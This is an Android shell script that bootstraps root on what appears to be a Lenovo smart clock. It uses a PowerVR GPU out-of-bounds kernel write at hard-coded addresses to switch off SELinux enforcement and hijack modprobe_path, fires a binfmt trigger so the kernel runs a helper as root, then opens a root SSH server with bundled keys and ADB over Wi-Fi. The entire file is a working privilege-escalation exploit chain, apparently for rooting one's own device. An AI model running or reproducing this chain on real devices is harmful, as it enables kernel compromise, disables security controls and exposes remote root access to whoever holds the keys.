#!/system/bin/sh
# One-shot root bootstrap for the clock, run by the app as its own uid.
# Mirrors tools/reroot.py: arm SELinux + modprobe_path through the PowerVR OOB
# write, fire the unknown-binfmt trigger, and let the kernel run our helper as
# root, which brings up the root channels (clockroot socket + Dropbear on 2223).
#
# Everything is bundled in assets/rootkit and already copied next to this
# script by RootKit.java, so nothing here needs the network or a host.
set -u

D=$(cd "$(dirname "$0")" 2>/dev/null && pwd)
F=$(cd "$D/.." 2>/dev/null && pwd)
if [ -z "$D" ] || [ -z "$F" ]; then
    echo "bootstrap: cannot locate my own directory"
    exit 1
fi
cd "$F" || exit 1

PROBE="$D/pvr_mmap_oob_probe"
CHANNEL="$D/clockroot"
HELPER="$D/hell.sh"
TRIG="$F/trig"
STAGE="$F/root-ssh-stage"

# Calibration for build LenovoCD-24502F_ROW_1.2.2.627_220105 (no KASLR, fixed
# mem_map): pfn = 0x40C78 + (V - 0x10f310e0)/36, verified 15/15 pages.
V_SELINUX=0x10f399b4      # pfn 0x41045: selinux_enforcing at page offset 0xffc
V_MODPROBE=0x10f36f84     # pfn 0x40f19: modprobe_path at page offset 0x8c
NFILLER=320
NCARRIERS=2
WINDOW=320
BAND=15
ROW0=270

say() { echo "$@"; }

say "== 1/7 preparing payloads"
chmod 700 "$PROBE" "$CHANNEL" "$HELPER" 2>/dev/null
mkdir -p "$STAGE/lib" 2>/dev/null
cp -f "$D/stage/simplesshd_dropbear_launcher" "$STAGE/" 2>/dev/null
cp -f "$D/stage/lib/"*.so "$STAGE/lib/" 2>/dev/null
umask 077
cp -f "$D/authorized_keys" "$STAGE/authorized_keys" 2>/dev/null
chmod 600 "$STAGE/authorized_keys" 2>/dev/null
cp -f "$HELPER" "$F/hell.sh" 2>/dev/null
chmod 700 "$F/hell.sh" 2>/dev/null
# A fresh random magic on every press. The kernel's request_module
# deduplicates in-flight requests by module name, so a fixed binfmt-ffff goes
# dead after the first few triggers (measured 2026-09-18: ffff stopped firing
# the helper while binfmt-1234/5678 fired immediately). Bytes 0..1 must stay
# non-printable or the kernel skips request_module entirely.
magic=$(printf 'ffff%04x' $(( (RANDOM * 256 + RANDOM) % 65536 )) )
printf '%s' "$magic" | xxd -r -p > "$TRIG"
chmod 700 "$TRIG" 2>/dev/null
say "   probe sha256 = $(sha256sum "$PROBE" 2>/dev/null | cut -c1-16)"
say "   trig bytes  = $(od -An -tx1 "$TRIG" 2>/dev/null | tr -d ' \n')"

# One probe pass; report whether the gated write verified. Each pass maps 15
# pages and the kmalloc-1024 layout only lands in some runs, so retry.
arm() {
    mode=$1; base=$2; pgoff=$3
    attempt=1
    while [ "$attempt" -le 8 ]; do
        run="rk_${mode}_${attempt}_$$"
        rm -f "mm_oob_${run}.dump" "bridge_fuzz_${run}.log" 2>/dev/null
        /system/bin/linker "$PROBE" MW "$run" "$NFILLER" "$NCARRIERS" "$base" \
            0x100000 0 "$WINDOW" "$BAND" "$ROW0" "$pgoff" 1 "$mode" --live \
            >/dev/null 2>&1
        dump="mm_oob_${run}.dump"
        if [ -f "$dump" ] && grep -q "MW_WRITE rc=1" "$dump" 2>/dev/null; then
            say "   mode $mode write verified (attempt $attempt)"
            return 0
        fi
        attempt=$((attempt + 1))
    done
    say "   mode $mode write FAILED after 8 attempts"
    return 1
}

# The enforcing int is read through the probe, not through /sys: reading that
# file needs privileges we do not have, and a failed read used to be mistaken
# for "already permissive", silently skipping the clear (that bug cost a whole
# session of failed triggers after a reboot).
enforcing_now() {
    r="rk_probe_$$"
    rm -f "mm_oob_${r}.dump" "bridge_fuzz_${r}.log" 2>/dev/null
    /system/bin/linker "$PROBE" MW "$r" "$NFILLER" "$NCARRIERS" "$V_SELINUX"         0x100000 0 "$WINDOW" "$BAND" "$ROW0" 4032 0 0 --live >/dev/null 2>&1
    d="mm_oob_${r}.dump"
    [ -f "$d" ] || { echo unknown; return; }
    if grep -q 'data=[0-9a-f]*01000000$' "$d" 2>/dev/null; then
        echo on
    else
        echo off
    fi
}

say "== 2/7 SELinux"
enforcing=$(enforcing_now)
say "   probe reports enforcing=$enforcing"
if [ "$enforcing" != "off" ]; then
    say "   clearing it (the kernel helper cannot exec an app_data_file"
    say "   while enforcing is on)"
    arm 2 "$V_SELINUX" 4032 || say "   (continuing anyway)"
else
    say "   already permissive"
fi

say "== 3/7 arming modprobe_path"
arm 1 "$V_MODPROBE" 0 || { say "FATAL: could not arm modprobe_path"; exit 1; }

say "== 4/7 firing unknown-binfmt trigger"
"$TRIG" >/dev/null 2>&1
say "   trigger fired"

say "== 5/7 starting SSH through the root channel"
# The helper starts its own Dropbear, but that one is a child of the kernel
# usermode-helper session and dies when that session is torn down (observed:
# listening for a moment, then refused). The clockroot daemon runs in its own
# session instead, so SSH is (re)started from there, detached.
R="$F/root-ssh-run"
LISTEN="<clock-ip>:2223"
ip=$(getprop dhcp.wlan0.ipaddress 2>/dev/null)
case "$ip" in
    [0-9]*.[0-9]*.[0-9]*.[0-9]*) LISTEN="$ip:2223" ;;
esac
if [ -x "$F/clockroot" ]; then
    "$F/clockroot" -c "kill \$(cat $R/dropbear-root.pid) 2>/dev/null; \
        cd $R && setsid /system/bin/linker $R/simplesshd_dropbear_launcher \
        $R/lib/libsimplesshd-jni.so $R $R/lib $LISTEN \
        > $R/ssh.out 2> $R/ssh.err < /dev/null &" >/dev/null 2>&1
    say "   asked root channel to serve on $LISTEN"
else
    say "   no root channel yet, relying on the helper's daemon"
fi

say "== 6/7 waiting for SSH on 2223"
up=0
i=1
while [ "$i" -le 20 ]; do
    if netstat -ltn 2>/dev/null | grep -q ':2223'; then up=1; break; fi
    sleep 2
    i=$((i + 1))
done

say "== 7/7 ADB over Wi-Fi"
# Same recipe reroot.py runs (adbwifi.sh): proparea writes service.adb.tcp.port
# into the shared property area -- the property service refuses our setprop --
# and adbd is restarted so it reads the port at startup. It goes through the
# root channel so ps/kill see every process (an app cannot see adbd).
# $D is this script's directory (filesDir/rootkit), which is where the assets
# live; adbwifi.sh resolves its own directory the same way for proparea.
if [ -f "$D/adbwifi.sh" ]; then
    # "on", not the no-argument form: the script toggles when given no mode, and
    # the bootstrap must always end with ADB over Wi-Fi up.
    "$F/clockroot" -c "sh $D/adbwifi.sh on" 2>&1 | while read -r line; do say "   $line"; done
else
    say "   missing $D/adbwifi.sh"
fi

say "== result"
say "   modprobe_path = $(cat /proc/sys/kernel/modprobe 2>/dev/null)"
if [ "$up" = "1" ]; then
    say "SSH READY on port 2223 as root  ->  ssh -p 2223 root@${LISTEN%%:*}"
else
    say "SSH NOT listening yet"
fi
if netstat -ltn 2>/dev/null | grep -q ':5555'; then
    say "ADB over Wi-Fi READY  ->  adb connect ${LISTEN%%:*}:5555"
else
    say "ADB over Wi-Fi is not listening on 5555"
fi
if [ -x "$F/clockroot" ]; then
    say "   app root channel: $("$F/clockroot" -c id 2>&1 | head -n 1)"
fi
exit 0
